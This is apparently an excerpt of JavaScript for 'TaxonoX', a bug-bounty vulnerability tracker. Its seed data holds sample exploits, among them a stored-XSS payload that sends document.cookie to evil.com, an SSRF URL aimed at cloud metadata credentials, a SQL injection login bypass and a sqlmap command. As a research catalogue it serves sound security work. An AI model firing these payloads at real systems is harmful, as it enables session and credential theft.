...
const Storage = {
  get(key, fallback = null) {
    try {
      const v = localStorage.getItem('txnx_' + key);
      return v ? JSON.parse(v) : fallback;
    } catch { return fallback; }
  },
  set(key, value) {
    try { localStorage.setItem('txnx_' + key, JSON.stringify(value)); } catch {}
  },
  remove(key) { localStorage.removeItem('txnx_' + key); }
};
...
const DEFAULT_VULNERABILITIES = [
  {
    id: 'VULN-001', name: 'SQL Injection', severity: 'Critical',
    owasp: 'A03:2021', cwe: 'CWE-89', status: 'Reported',
    date: '2024-05-22', tags: ['SQLi', 'Auth', 'P1'],
    target: 'api.example.com', platform: 'HackerOne',
    shortDesc: 'SQL injection via login parameter allows full DB dump.',
    howToFind: 'Test POST /login with single quote in email field.',
    exploit: "' OR 1=1--",
    remediation: 'Use parameterized queries and prepared statements.',
    starred: true, viewed: Date.now()
  },
  {
    id: 'VULN-002', name: 'XSS (Stored)', severity: 'High',
    owasp: 'A03:2021', cwe: 'CWE-79', status: 'In Progress',
    date: '2024-05-20', tags: ['XSS', 'P2'],
    target: 'app.target.io', platform: 'Bugcrowd',
    shortDesc: 'Stored XSS in user bio field reflected to all users.',
    howToFind: 'Input <script>alert(1)</script> in profile bio.',
    exploit: '<img src=x onerror=fetch(`https://evil.com/c?c=${document.cookie})>',
    remediation: 'Sanitize and encode all user-supplied HTML output.',
    starred: false, viewed: Date.now() - 3600000
  },
  {
    id: 'VULN-003', name: 'IDOR', severity: 'High',
    owasp: 'A01:2021', cwe: 'CWE-639', status: 'New',
    date: '2024-05-20', tags: ['IDOR', 'API', 'P2'],
    target: 'api.shop.com', platform: 'HackerOne',
    shortDesc: 'IDOR on /api/orders/{id} leaks other users orders.',
    howToFind: 'Enumerate order IDs after authenticating as user A.',
    exploit: 'GET /api/orders/1337 with any authenticated session.',
    remediation: 'Verify ownership server-side for every object access.',
    starred: false, viewed: Date.now() - 7200000
  },
  {
    id: 'VULN-004', name: 'SSRF', severity: 'Medium',
    owasp: 'A10:2021', cwe: 'CWE-918', status: 'Confirmed',
    date: '2024-05-19', tags: ['SSRF', 'Cloud', 'P3'],
    target: 'internal.corp.io', platform: 'Private',
    shortDesc: 'SSRF via webhook URL parameter fetches internal metadata.',
    howToFind: 'Set webhook URL to http://169.254.169.254/latest/meta-data/',
    exploit: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
    remediation: 'Validate and allowlist webhook URLs. Block RFC1918.',
    starred: true, viewed: Date.now() - 1800000
  },
  {
    id: 'VULN-005', name: 'CSRF', severity: 'Medium',
    owasp: 'A01:2021', cwe: 'CWE-352', status: 'New',
    date: '2024-05-19', tags: ['CSRF', 'P3'],
    target: 'dashboard.saas.io', platform: 'HackerOne',
    shortDesc: 'Missing CSRF token on account deletion endpoint.',
    howToFind: 'Submit DELETE /account without CSRF token.',
    exploit: '<form action="https://dashboard.saas.io/account" method="POST">',
    remediation: 'Implement CSRF tokens and SameSite cookie attribute.',
    starred: false, viewed: Date.now() - 5400000
  },
  {
    id: 'VULN-006', name: 'Clickjacking', severity: 'Low',
    owasp: 'A05:2021', cwe: 'CWE-1021', status: 'Duplicate',
    date: '2024-05-18', tags: ['P4'],
    target: 'portal.example.com', platform: 'Bugcrowd',
    shortDesc: 'Missing X-Frame-Options allows page embedding.',
    howToFind: 'Embed target in iframe — no CSP blocking observed.',
    exploit: '<iframe src="https://portal.example.com/settings">',
    remediation: 'Add X-Frame-Options: DENY or CSP frame-ancestors.',
    starred: false, viewed: Date.now() - 9000000
  }
];
...
const DEFAULT_TOOLS = [
  ...
  { id: 'TOOL-005', name: 'sqlmap', category: 'Exploit', description: 'Automatic SQL injection and database takeover tool', commands: 'sqlmap -u "http://target.com/?id=1" --dbs', tags: ['SQLi', 'Exploit'] }
];
...
function initData() {
  ...
  if (!Storage.get('settings')) {
    Storage.set('settings', {
      username: 'HunterX', role: 'Bug Hunter',
      theme: 'dark', accentColor: 'purple'
    });
  }
}
...
function initSidebar() {
  ...
  const toggleBtns = document.querySelectorAll('.navbar-toggle, .sidebar-toggle-btn');
...
function initSearch() {
  ...
  input.addEventListener('input', () => {
    ...
    debounce = setTimeout(() => {
      ...
      if (!hits.length) { results.innerHTML = '<div style="padding:12px 14px;color:var(--text-muted);font-size:12px">No results found</div>'; }
      else {
        results.innerHTML = hits.map(v => `
          <div class="search-result-item" onclick="window.location.href='vulnerability.html?id=${v.id}'">
            <span class="severity-dot ${v.severity.toLowerCase()}"></span>
            <div>
              <div class="search-result-name">${highlight(v.name, q)}</div>
              <div class="search-result-meta">${v.id} · ${v.severity} · ${v.status}</div>
            </div>
          </div>
        `).join('');
      }
...
function setActiveNav() {
  ...
  document.querySelectorAll('.nav-item').forEach(el => {
    ...
    if (href === current || (current === 'index.html' && href === 'dashboard.html') ||
        (current === '' && href === 'dashboard.html')) {
...
function initUserDisplay() {
  const settings = Storage.get('settings', { username: 'HunterX', role: 'Bug Hunter' });
  document.querySelectorAll('.user-name-display').forEach(el => el.textContent = settings.username);
  document.querySelectorAll('.user-role-display').forEach(el => el.textContent = settings.role);
  document.querySelectorAll('.user-avatar-display').forEach(el => {
    el.textContent = (settings.username || 'H')[0].toUpperCase();
  });
}
...
function severityColor(s) {
  const map = { critical: '#ff2d55', high: '#ff6b35', medium: '#fbbf24', low: '#06b6d4', info: '#8b5cf6' };
...
function initKeyboardShortcuts() {
  const shortcuts = {
    'n': () => { const btn = document.getElementById('add-vuln-btn'); if (btn) btn.click(); },
...
window.TaxonoX = {
  ...
  getVulnStats, exportData, importData, animateCounter
};
